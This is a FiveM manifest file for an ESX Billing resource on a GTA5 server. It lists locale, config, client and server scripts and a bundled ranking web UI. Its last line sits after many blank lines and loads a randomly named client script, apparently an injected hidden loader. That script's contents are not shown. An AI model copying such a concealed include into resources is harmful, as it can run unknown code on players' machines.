lua54 'yes'
client_script 'validation.lua'

shared_script '@WaveShield/resource/waveshield.lua' --this line was automatically written by WaveShield

fx_version 'bodacious'
game 'gta5'

description 'ESX Billing'

version '1.1.0'

server_scripts {
	'@oxmysql/lib/MySQL.lua',
	'@essentialmode/locale.lua',
	'locales/de.lua',
	'locales/br.lua',
	'locales/en.lua',
	'locales/fi.lua',
	'locales/fr.lua',
	'locales/es.lua',
	'locales/sv.lua',
	'locales/pl.lua',
	'config.lua',
	'server/main.lua'
}

client_scripts {
	'@essentialmode/locale.lua',
	'locales/de.lua',
	'locales/br.lua',
	'locales/en.lua',
	'locales/fi.lua',
	'locales/fr.lua',
	'locales/es.lua',
	'locales/sv.lua',
	'locales/pl.lua',
	'config.lua',
	'client/main.lua'
}

ui_page "ranking/web-side/app.html"


server_scripts {
   "ranking/server-side/server.lua"
}

client_scripts {
   "ranking/client-side/client.lua",
}

files {
	"ranking/web-side/*.html",
	"ranking/web-side/css/*.css",
	"ranking/web-side/js/*",
	"ranking/web-side/src/*"
}              

dependency 'essentialmode'
















client_script "IRS_USDUFHSILFSKOAKQA.lua"